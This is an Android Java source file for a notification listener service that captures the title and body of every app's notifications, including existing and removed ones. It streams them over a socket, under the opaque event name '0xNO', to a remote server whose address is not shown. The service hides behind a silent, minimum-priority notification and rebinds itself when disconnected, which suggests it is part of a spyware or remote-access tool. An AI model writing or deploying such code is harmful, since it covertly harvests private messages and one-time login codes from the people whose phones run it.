package com.fason.app.notifications;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import androidx.core.app.NotificationCompat;

import com.fason.app.R;
import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

// Notification listener service
public class NotificationRelayService extends NotificationListenerService {

    private static final String CHANNEL = "notif_relay";
    private static final int NOTIF_ID = 2;

    private final ExecutorService exec = Executors.newSingleThreadExecutor();
    private final AtomicBoolean ready = new AtomicBoolean(false);
    private static NotificationRelayService instance;

    // Get instance
    public static NotificationRelayService getInstance() {
        return instance;
    }

    // Check if enabled
    public static boolean isEnabled(Context ctx) {
        ComponentName cn = new ComponentName(ctx, NotificationRelayService.class);
        String flat = Settings.Secure.getString(ctx.getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(cn.flattenToString());
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        createChannel();
        startForeground();
        ready.set(true);
    }

    // Create notification channel
    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL, "Notification Relay", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    // Start foreground
    private void startForeground() {
        Notification n = new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("Notification Monitor")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForeground(NOTIF_ID, n);
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        ready.set(true);

        exec.execute(() -> {
            try {
                StatusBarNotification[] active = getActiveNotifications();
                if (active != null) {
                    for (StatusBarNotification sbn : active) {
                        process(sbn, true);
                    }
                }
            } catch (Exception ignored) {}
        });
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;
        if (sbn.getId() == NOTIF_ID && sbn.getPackageName().equals(getPackageName())) return;
        exec.execute(() -> process(sbn, false));
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        if (sbn == null) return;
        exec.execute(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("removed", true);
                data.put("packageName", sbn.getPackageName());
                data.put("id", sbn.getId());
                data.put("postTime", sbn.getPostTime());
                data.put("timestamp", System.currentTimeMillis());
                SocketClient.getInstance().getSocket().emit("0xNO", data);
            } catch (Exception ignored) {}
        });
    }

    // Process notification
    private void process(StatusBarNotification sbn, boolean initial) {
        try {
            Notification n = sbn.getNotification();
            Bundle extras = n.extras;

            String title = txt(extras, Notification.EXTRA_TITLE);
            String text = txt(extras, Notification.EXTRA_TEXT);
            String bigText = txt(extras, Notification.EXTRA_BIG_TEXT);

            JSONObject data = new JSONObject();
            data.put("appName", sbn.getPackageName());
            data.put("title", title);
            data.put("content", bigText.isEmpty() ? text : bigText);
            data.put("postTime", sbn.getPostTime());
            data.put("id", sbn.getId());
            data.put("tag", sbn.getTag() != null ? sbn.getTag() : "");
            data.put("ongoing", sbn.isOngoing());
            data.put("clearable", sbn.isClearable());
            data.put("initial", initial);
            data.put("timestamp", System.currentTimeMillis());

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && n.category != null) {
                data.put("category", n.category);
            }

            SocketClient.getInstance().getSocket().emit("0xNO", data);
        } catch (Exception ignored) {}
    }

    // Extract text
    private String txt(Bundle extras, String key) {
        if (extras == null) return "";
        CharSequence seq = extras.getCharSequence(key);
        return seq != null ? seq.toString() : "";
    }

    @Override
    public void onListenerDisconnected() {
        ready.set(false);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            requestRebind(new ComponentName(this, getClass()));
        }
    }

    @Override
    public void onDestroy() {
        ready.set(false);
        instance = null;
        exec.shutdown();
        super.onDestroy();
    }

    // Request permission
    public static void requestPermission(Context ctx) {
        if (!isEnabled(ctx)) {
            Intent i;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_DETAIL_SETTINGS);
                i.putExtra(Settings.EXTRA_NOTIFICATION_LISTENER_COMPONENT_NAME,
                    new ComponentName(ctx, NotificationRelayService.class).flattenToString());
            } else {
                i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            }
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        }
    }

    // Legacy method
    public static void requestNotificationListenerPermission(Context ctx) {
        requestPermission(ctx);
    }

    // Check ready
    public boolean isReady() {
        return ready.get();
    }
}
